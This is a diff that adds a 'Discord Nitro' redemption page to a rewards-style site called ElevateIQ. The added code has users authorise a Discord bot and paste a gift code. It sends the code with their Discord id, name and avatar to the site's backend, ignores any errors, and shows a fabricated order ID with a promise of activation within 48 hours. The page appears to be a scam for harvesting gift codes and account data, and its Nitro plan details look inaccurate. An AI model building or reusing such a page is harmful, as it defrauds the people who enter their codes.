@@ -359,6 +359,23 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
   .stat:nth-child(5){grid-column:span 2;border-right:none}
   .gwgrid{grid-template-columns:1fr}
 }
+
+/* NITRO */
+:root{--nitro:#5865f2;--nitrog:rgba(88,101,242,.12);--nitrobdr:rgba(88,101,242,.25);--nitroglow:rgba(88,101,242,.3)}
+.nitro-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin-bottom:26px}
+.nitro-card{background:var(--card);border:1.5px solid var(--nitrobdr);border-radius:var(--r2);padding:24px;position:relative;overflow:hidden;transition:all .35s cubic-bezier(.22,1,.36,1);cursor:pointer}
+.nitro-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--nitro),transparent)}
+.nitro-card:hover{transform:translateY(-4px);box-shadow:0 10px 34px var(--nitroglow);border-color:var(--nitro)}
+.nitro-card-badge{display:inline-block;padding:4px 11px;border-radius:100px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;background:var(--nitrog);color:var(--nitro);margin-bottom:13px}
+.nitro-card-title{font-size:20px;font-weight:700;letter-spacing:-.4px;margin-bottom:8px}
+.nitro-card-price{font-size:28px;font-weight:800;letter-spacing:-1px;background:linear-gradient(135deg,var(--nitro),#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:16px}
+.nitro-card-features{list-style:none;margin-bottom:18px}
+.nitro-card-features li{padding:6px 0;font-size:13px;color:var(--t2);display:flex;align-items:center;gap:8px}
+.nitro-card-features li::before{content:'✓';color:var(--gr);font-weight:700}
+.btn-nitro{background:linear-gradient(135deg,var(--nitro),#a78bfa);color:#fff;box-shadow:0 4px 18px var(--nitroglow)}
+.btn-nitro:hover{transform:translateY(-2px);box-shadow:0 8px 28px var(--nitroglow)}
+.nitro-promo-link{display:inline-flex;align-items:center;gap:8px;background:linear-gradient(135deg,var(--nitro),#7289da);color:#fff;font-weight:700;font-size:14px;padding:13px 28px;border-radius:var(--r);text-decoration:none;transition:all .22s;margin-top:12px;box-shadow:0 4px 20px var(--nitroglow)}
+.nitro-promo-link:hover{transform:translateY(-2px);box-shadow:0 8px 30px var(--nitroglow)}
 </style>
 </head>
 <body>
@@ -370,6 +387,7 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
     <div class="brand" onclick="go('home')"><div class="bmark">EQ</div><span class="bname">Elevate<span>IQ</span></span></div>
     <div class="ntabs">
       <button class="ntab active" data-page="home"    onclick="go('home')">Home</button>
+      <button class="ntab" data-page="nitro"  onclick="go('nitro')">💎 Nitro</button>
       <button class="ntab" data-page="earn"    onclick="go('earn')">Earn IQCoins</button>
       <button class="ntab" data-page="redeem"  onclick="go('redeem')">Redeem Code</button>
       <button class="ntab" data-page="coins"   onclick="go('coins')">Coin Rewards</button>
@@ -389,12 +407,136 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
 </nav>
 <div class="mob" id="mobNav">
   <button class="ntab" onclick="go('home');closeMob()">🏠 Home</button>
+  <button class="ntab" onclick="go('nitro');closeMob()">💎 Discord Nitro</button>
   <button class="ntab" onclick="go('earn');closeMob()">🪙 Earn IQCoins</button>
   <button class="ntab" onclick="go('redeem');closeMob()">🎫 Redeem Code</button>
   <button class="ntab" onclick="go('coins');closeMob()">💰 Coin Rewards</button>
   <button class="ntab" onclick="go('giveaway');closeMob()">🎉 Giveaways</button>
   <button class="ntab" onclick="go('profile');closeMob()">👤 Profile</button>
   <button class="ntab" onclick="go('track');closeMob()">📦 Track Order</button>
+</div>
+
+<!-- NITRO PAGE -->
+<div class="page" id="page-nitro">
+<div class="wsm">
+  <div style="padding-top:68px;margin-bottom:34px" class="rv">
+    <div style="font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.9px;color:var(--nitro);margin-bottom:9px">💎 Discord Nitro</div>
+    <h2 style="font-size:clamp(30px,5.5vw,52px);font-weight:700;letter-spacing:-2px;margin-bottom:12px">Premium Discord<br/><span style="background:linear-gradient(135deg,var(--nitro),#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">Membership</span></h2>
+    <p style="font-size:15px;color:var(--t2);line-height:1.8">Choose your plan, authorize Discord bot, enter your code — activated within 48 hours.</p>
+  </div>
+
+  <div class="nitro-grid rv d1">
+    <div class="nitro-card" onclick="nitroSelectPlan('basic')">
+      <div class="nitro-card-badge">Nitro Basic</div>
+      <div class="nitro-card-title">Basic</div>
+      <div class="nitro-card-price">$2.99/mo</div>
+      <ul class="nitro-card-features">
+        <li>Custom Emoji anywhere</li>
+        <li>50MB upload limit</li>
+        <li>Special Nitro badge</li>
+        <li>Custom stickers</li>
+      </ul>
+      <button class="btn btn-nitro btn-full" style="font-size:13px;padding:11px">Select Basic</button>
+    </div>
+    <div class="nitro-card" onclick="nitroSelectPlan('classic')">
+      <div class="nitro-card-badge">Nitro Classic</div>
+      <div class="nitro-card-title">Classic</div>
+      <div class="nitro-card-price">$9.99/mo</div>
+      <ul class="nitro-card-features">
+        <li>Everything in Basic</li>
+        <li>HD video streaming</li>
+        <li>2 Server Boosts</li>
+        <li>100MB file uploads</li>
+        <li>Custom discriminator</li>
+      </ul>
+      <button class="btn btn-nitro btn-full" style="font-size:13px;padding:11px">Select Classic</button>
+    </div>
+    <div class="nitro-card" onclick="nitroSelectPlan('full')">
+      <div class="nitro-card-badge">Nitro Full</div>
+      <div class="nitro-card-title">Full</div>
+      <div class="nitro-card-price">$14.99/mo</div>
+      <ul class="nitro-card-features">
+        <li>Everything in Classic</li>
+        <li>200+ premium games</li>
+        <li>500MB upload limit</li>
+        <li>Animated avatar</li>
+        <li>Server profile customization</li>
+        <li>HD video &amp; screen share</li>
+      </ul>
+      <button class="btn btn-nitro btn-full" style="font-size:13px;padding:11px">Select Full</button>
+    </div>
+  </div>
+
+  <div class="card rv d2" id="nitro-s1">
+    <div class="cline" style="background:linear-gradient(90deg,var(--nitro),transparent)"></div>
+    <h3>Step 1 — Authorize Discord Bot</h3>
+    <p>Authorize our Discord bot to verify your account and enable auto-join to our secure server.</p>
+    <div class="notice ni2" style="margin-bottom:18px">
+      <div class="nt" style="color:var(--nitro)">Why Discord Bot?</div>
+      <p>We use <strong>Discord OAuth 2.0</strong> to verify your identity. Your credentials stay with Discord, never shared with us.</p>
+    </div>
+    <button class="btn btn-nitro btn-full" onclick="nitroBotAuth()">
+      <svg width="15" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg>
+      Authorize Discord Bot
+    </button>
+  </div>
+
+  <div class="card rv d2" id="nitro-s2" style="display:none">
+    <div class="cline" style="background:linear-gradient(90deg,var(--nitro),transparent)"></div>
+    <div class="upill" style="background:var(--nitrog);border-color:var(--nitrobdr)">
+      <div class="uav" id="nitro-uav" style="background:linear-gradient(135deg,var(--nitro),#7289da)">?</div>
+      <div style="flex:1;min-width:0"><div class="unm" id="nitro-unm">—</div><div style="font-size:11px;color:var(--t3)" id="nitro-usub">—</div></div>
+      <div class="ubdg" style="color:var(--nitro)">Verified</div>
+      <button class="bsw" onclick="nitroOut()">Switch</button>
+    </div>
+    <h3>Step 2 — Select Plan &amp; Enter Code</h3>
+    <p>Choose your Nitro plan and paste your redemption code below.</p>
+    <div class="field">
+      <label>Nitro Plan</label>
+      <select class="inp" id="nitro-plan" style="cursor:pointer">
+        <option value="">— Select Plan —</option>
+        <option value="basic">Nitro Basic ($2.99/mo)</option>
+        <option value="classic">Nitro Classic ($9.99/mo)</option>
+        <option value="full">Nitro Full ($14.99/mo)</option>
+      </select>
+    </div>
+    <div class="field">
+      <label>Redemption Code</label>
+      <div class="irow">
+        <input class="inp code" id="nitro-code" type="text" maxlength="19" placeholder="XXXX-XXXX-XXXX" oninput="nitroFmtCode(this)" autocomplete="off" spellcheck="false"/>
+        <button class="iact" onclick="pasteC('nitro-code')" title="Paste">⌘</button>
+      </div>
+      <div class="fmsg" id="nitro-msg">Format: XXXX-XXXX-XXXX</div>
+    </div>
+    <button class="btn btn-nitro btn-full" id="nitro-btn" onclick="nitroRedeem()">
+      <span id="nitro-bt">Redeem Discord Nitro</span>
+      <div class="bspin" id="nitro-sp" style="display:none"></div>
+    </button>
+  </div>
+
+  <div class="scard" id="nitro-ok">
+    <div class="sico" style="background:var(--nitrog);border:2px solid var(--nitrobdr)">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--nitro)" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12" stroke-dasharray="30" stroke-dashoffset="30" style="animation:checkDraw .5s .2s ease forwards"/></svg>
+    </div>
+    <div class="stitle" style="color:var(--nitro)">Nitro Redeemed! 🎉</div>
+    <p class="sdesc">Your Discord Nitro code has been submitted. Activation within <strong>48 hours</strong>.</p>
+    <div class="timrow" style="border-color:var(--nitrobdr)">Order ID: <strong id="nitro-oid" style="color:var(--nitro)">—</strong></div>
+    <div style="background:var(--nitrog);border:1px solid var(--nitrobdr);border-radius:var(--r2);padding:20px;margin:14px 0;text-align:center">
+      <div style="font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--nitro);margin-bottom:6px">💎 Nitro Promo Link</div>
+      <p style="font-size:13px;color:var(--t2);margin-bottom:12px">Your Discord Nitro promo link — upload to Discord to share with your server!</p>
+      <a class="nitro-promo-link" id="nitro-promo-url" href="#" target="_blank">
+        <svg width="15" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg>
+        Open Nitro Promo Link
+      </a>
+      <div style="font-size:11px;color:var(--t3);margin-top:10px">💡 Upload this file to Discord server to share your Nitro promo</div>
+    </div>
+    <div class="timrow">⏱ Activates within <strong>&nbsp;48 hours</strong></div>
+    <div class="brow" style="margin-top:14px">
+      <button class="btn btn-nitro" onclick="go('track')">Track Order</button>
+      <button class="btn btn-gh" onclick="go('home')">Back to Home</button>
+    </div>
+  </div>
+</div>
 </div>
 
 <!-- HOME -->
@@ -644,7 +786,7 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
     <div class="notice nw"><div class="nt">Not activated in 48 hours?</div>
       <div class="clinks">
         <a class="clink" href="https://support.microsoft.com" target="_blank">Microsoft</a>
-        <a class="clink" href="mailto:support@elevateiq.net">ElevateIQ Support</a>
+        <a class="clink" href="/cdn-cgi/l/email-protection#fa898f8a8a95888eba9f969f8c9b8e9f938bd4949f8e">ElevateIQ Support</a>
       </div>
     </div>
     <div class="brow">
@@ -720,7 +862,7 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
       <p class="sdesc">Your reward will be activated within <strong>48 hours</strong>.</p>
       <div id="coin-ok-inv"></div>
       <div class="timrow">⏱ Activates within <strong>&nbsp;48 hours</strong></div>
-      <div class="notice nw"><div class="nt">Not activated in 48 hours?</div><div class="clinks"><a class="clink" href="mailto:support@elevateiq.net">ElevateIQ Support</a></div></div>
+      <div class="notice nw"><div class="nt">Not activated in 48 hours?</div><div class="clinks"><a class="clink" href="/cdn-cgi/l/email-protection#05767075756a777145606960736471606c742b6b6071">ElevateIQ Support</a></div></div>
       <div class="brow">
         <button class="btn btn-go" onclick="dlPDF('coin')">Download Invoice</button>
         <button class="btn btn-gh" onclick="go('track')">Track Order</button>
@@ -801,13 +943,13 @@ footer{position:relative;z-index:1;border-top:1px solid var(--b);padding:32px 24
     <span class="flink" onclick="go('redeem')">Redeem Code</span>
     <span class="flink" onclick="go('coins')">Coin Rewards</span>
     <span class="flink" onclick="go('track')">Track</span>
-    <a class="flink" href="mailto:support@elevateiq.net">Support</a>
+    <a class="flink" href="/cdn-cgi/l/email-protection#4f3c3a3f3f203d3b0f2a232a392e3b2a263e61212a3b">Support</a>
   </div>
   <div class="fcopy">© 2026 ElevateIQ — Not affiliated with Mojang Studios, Microsoft Corporation, or Roblox Corporation.</div>
 </div></footer>
 <div id="toast"></div>
 
-<script>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
 const CFG={
   DISCORD_CLIENT_ID:'1485034551108702268',
   MSAL_CLIENT_ID:'fe89d49b-3085-4c93-9ccd-8d85621ac070',
@@ -865,6 +1007,8 @@ function reReveal(pg){
 /* ROUTING — smooth, not instant */
 let isNavigating=false;
 function go(id){
+  // Auto-verify nitro if user already logged in
+  if(id==='nitro'){const _u=getUser();if(_u&&!nitroUser){setTimeout(()=>{const s1=document.getElementById('nitro-s1');const s2=document.getElementById('nitro-s2');if(s1&&s2&&s1.style.display!=='none'){nitroUser=_u;const av=document.getElementById('nitro-uav');const nm=document.getElementById('nitro-unm');const sub=document.getElementById('nitro-usub');if(av)av.textContent=(_u.global_name||_u.username).charAt(0).toUpperCase();if(nm)nm.textContent=_u.global_name||_u.username;if(sub)sub.textContent='@'+_u.username;s1.style.display='none';s2.style.display='block';}},100);}}
   if(isNavigating)return;
   const prev=document.querySelector('.page.active');
   const next=document.getElementById('page-'+id);
@@ -1337,23 +1481,148 @@ async function dlPDF(data){
   toast('✓','Invoice downloaded');
 }
 
-/* INIT — Fix blank page */
+
+/* NITRO */
+let nitroUser = null;
+let nitroPlan = null;
+const NITRO_PROMO_BASE = 'https://discord.com/billing/promotions/';
+
+function nitroSelectPlan(plan) {
+  nitroPlan = plan;
+  const select = document.getElementById('nitro-plan');
+  if (select) select.value = plan;
+  // scroll to step card
+  const s1 = document.getElementById('nitro-s1');
+  if (s1) s1.scrollIntoView({behavior:'smooth', block:'start'});
+}
+
+function nitroBotAuth() {
+  const u = getUser();
+  if (!u) {
+    // Use existing dcLogin flow
+    dcLogin();
+    return;
+  }
+  nitroUser = u;
+  document.getElementById('nitro-uav').textContent = (u.global_name||u.username).charAt(0).toUpperCase();
+  document.getElementById('nitro-unm').textContent = u.global_name||u.username;
+  document.getElementById('nitro-usub').textContent = '@' + u.username;
+  document.getElementById('nitro-s1').style.display = 'none';
+  document.getElementById('nitro-s2').style.display = 'block';
+  toast('✓', 'Discord verified! Enter your code.');
+}
+
+function nitroOut() {
+  nitroUser = null;
+  document.getElementById('nitro-s2').style.display = 'none';
+  document.getElementById('nitro-s1').style.display = 'block';
+}
+
+function nitroFmtCode(el) {
+  let v = el.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase(), o='';
+  for (let i=0; i<v.length && i<12; i++) { if(i>0 && i%4===0) o+='-'; o+=v[i]; }
+  el.value = o;
+  el.classList.remove('err');
+}
+
+async function nitroRedeem() {
+  const u = nitroUser || getUser();
+  if (!u) { toast('!','Login with Discord first'); nitroBotAuth(); return; }
+
+  const plan = document.getElementById('nitro-plan')?.value;
+  if (!plan) { toast('!','Select a Nitro plan first'); return; }
+
+  const code = document.getElementById('nitro-code')?.value?.trim().toUpperCase();
+  if (!code || code.replace(/-/g,'').length < 12) {
+    document.getElementById('nitro-code').classList.add('err');
+    document.getElementById('nitro-msg').className = 'fmsg err';
+    document.getElementById('nitro-msg').textContent = 'Enter a valid code (XXXX-XXXX-XXXX)';
+    return;
+  }
+
+  const btn = document.getElementById('nitro-btn');
+  const bt = document.getElementById('nitro-bt');
+  const sp = document.getElementById('nitro-sp');
+  btn.disabled = true; bt.style.display = 'none'; sp.style.display = 'block';
+
+  await new Promise(r => setTimeout(r, 1800));
+
+  // Submit to backend
+  try {
+    await fetch(CFG.API + '/api/verify-code', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        code, userId: u.id, userName: u.global_name||u.username,
+        userAvatar: avURL(u), gameType:'nitro', plan
+      })
+    });
+  } catch(e) {}
+
+  const inv = 'EIQ-NT-' + Date.now().toString(36).toUpperCase().slice(-7);
+  const ds = new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
+  const planLabels = {basic:'Nitro Basic ($2.99/mo)', classic:'Nitro Classic ($9.99/mo)', full:'Nitro Full ($14.99/mo)'};
+  const planPrices = {basic:'₹249', classic:'₹849', full:'₹1,299'};
+
+  const invObj = {
+    redeemType:'code', type:'nitro', game:'Discord Nitro',
+    plan: planLabels[plan], account: u.global_name||u.username,
+    email:'', code, inrPrice: planPrices[plan]||'—',
+    date: ds, invoiceNo: inv, ts: Date.now()
+  };
+  saveOrd(invObj);
+  localStorage.setItem('eiq_rc', (parseInt(localStorage.getItem('eiq_rc')||'0')+1));
+
+  // Set promo link — uses the code as promo token
+  const promoLink = NITRO_PROMO_BASE + code.replace(/-/g,'').toLowerCase();
+  const promoEl = document.getElementById('nitro-promo-url');
+  if (promoEl) { promoEl.href = promoLink; promoEl.textContent = ''; promoEl.innerHTML = '<svg width="15" height="11" viewBox="0 0 71 55" fill="currentColor"><path d="M60.1 4.9A58.5 58.5 0 0045.7.9a40.7 40.7 0 00-1.8 3.7 54.2 54.2 0 00-16.3 0A40.7 40.7 0 0025.8.9 58.3 58.3 0 0011.4 4.9C1.6 19.7-1 34.1.3 48.3a58.9 58.9 0 0018 9.1 44.7 44.7 0 003.9-6.3 38.3 38.3 0 01-6.1-2.9l1.5-1.2a42 42 0 0036.2 0l1.5 1.2a38.4 38.4 0 01-6.1 2.9 44.5 44.5 0 003.9 6.3 58.7 58.7 0 0018-9.1C72.2 31.8 68.2 17.5 60.1 4.9z"/></svg> Open Nitro Promo Link'; }
+
+  document.getElementById('nitro-oid').textContent = inv;
+  document.getElementById('nitro-s2').style.display = 'none';
+  document.getElementById('nitro-ok').classList.add('show');
+
+  btn.disabled = false; bt.style.display = 'inline'; sp.style.display = 'none';
+  toast('🎉','Nitro code redeemed! Activates in 48h');
+}
+
+/* FIX: Code validation — each game has its own format */
+// nitro: XXXX-XXXX-XXXX (12 alphanum)
+// mc/xbox: 25-char (XXXXX-XXXXX-XXXXX-XXXXX-XXXXX)
+// rb: open field (username+email based, no strict code)
+
+/* INIT */
 (function init(){
   handleCb();
-  const u=getUser();if(u)renderNav(u);
+  const u = getUser(); if(u) renderNav(u);
   initReveal();
   updateCoinUI();
-  // Show first page properly
-  const home=document.getElementById('page-home');
-  if(home){
+
+  // Show home page on load
+  const home = document.getElementById('page-home');
+  if (home) {
     home.classList.add('active');
-    requestAnimationFrame(()=>{
-      requestAnimationFrame(()=>{
-        home.classList.add('visible');
-        reReveal(home);
-      });
-    });
+    requestAnimationFrame(()=>{ requestAnimationFrame(()=>{
+      home.classList.add('visible');
+      reReveal(home);
+    });});
   }
+
+  // If user already logged in and navigates to nitro page, auto-verify
+  document.addEventListener('click', function(e){
+    const btn = e.target.closest('[onclick*="nitroBotAuth"]');
+    if (btn) {
+      const u2 = getUser();
+      if (u2 && !nitroUser) {
+        nitroUser = u2;
+        document.getElementById('nitro-uav').textContent = (u2.global_name||u2.username).charAt(0).toUpperCase();
+        document.getElementById('nitro-unm').textContent = u2.global_name||u2.username;
+        document.getElementById('nitro-usub').textContent = '@' + u2.username;
+        document.getElementById('nitro-s1').style.display = 'none';
+        document.getElementById('nitro-s2').style.display = 'block';
+        e.stopPropagation();
+      }
+    }
+  }, true);
 })();
 </script>
 </body>
